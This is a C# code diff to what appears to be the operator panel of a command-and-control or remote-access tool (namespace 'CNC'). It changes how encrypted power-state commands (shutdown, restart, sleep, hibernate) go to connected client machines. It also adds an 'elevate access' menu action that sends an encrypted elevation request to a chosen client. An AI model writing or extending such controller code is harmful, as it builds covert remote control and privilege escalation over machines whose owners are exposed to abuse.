@@ -100,25 +100,25 @@ namespace CNC
         private void shutdownToolStripMenuItem_Click(object sender, EventArgs e)
         {
             Client client = (Client)clientListView.FocusedItem.Tag;
-            client.Connection.SendReceiveObject<string, string>("SetPowerStateReq", "SetPowerStateRep", 10000, Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Shutdown)));
+            client.Connection.SendObject<string>("SetPowerStateReq", Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Shutdown)));
         }
 
         private void restartToolStripMenuItem_Click(object sender, EventArgs e)
         {
             Client client = (Client)clientListView.FocusedItem.Tag;
-            client.Connection.SendReceiveObject<string, string>("SetPowerStateReq", "SetPowerStateRep", 10000, Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Restart)));
+            client.Connection.SendObject<string>("SetPowerStateReq", Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Restart)));
         }
 
         private void sleepToolStripMenuItem_Click(object sender, EventArgs e)
         {
             Client client = (Client)clientListView.FocusedItem.Tag;
-            client.Connection.SendReceiveObject<string, string>("SetPowerStateReq", "SetPowerStateRep", 10000, Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Sleep)));
+            client.Connection.SendObject<string>("SetPowerStateReq", Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Sleep)));
         }
 
         private void hibernateToolStripMenuItem_Click(object sender, EventArgs e)
         {
             Client client = (Client)clientListView.FocusedItem.Tag;
-            client.Connection.SendReceiveObject<string, string>("SetPowerStateReq", "SetPowerStateRep", 10000, Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Hibernate)));
+            client.Connection.SendObject<string>("SetPowerStateReq", Cryptography.Encrypt(JsonConvert.SerializeObject(PowerStateE.Hibernate)));
         }
 
         private void remoteControllToolStripMenuItem_Click(object sender, EventArgs e)
@@ -131,6 +131,12 @@ namespace CNC
         {
             Client client = (Client)clientListView.FocusedItem.Tag;
             client.Connection.SendObject<string>("CloseReq", Cryptography.Encrypt(Guid.NewGuid().ToString()));
+        }
+
+        private void elevateAccessToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            Client client = (Client)clientListView.FocusedItem.Tag;
+            client.Connection.SendObject<string>("ElevateReq", Cryptography.Encrypt(Guid.NewGuid().ToString()));
         }
     }
 }
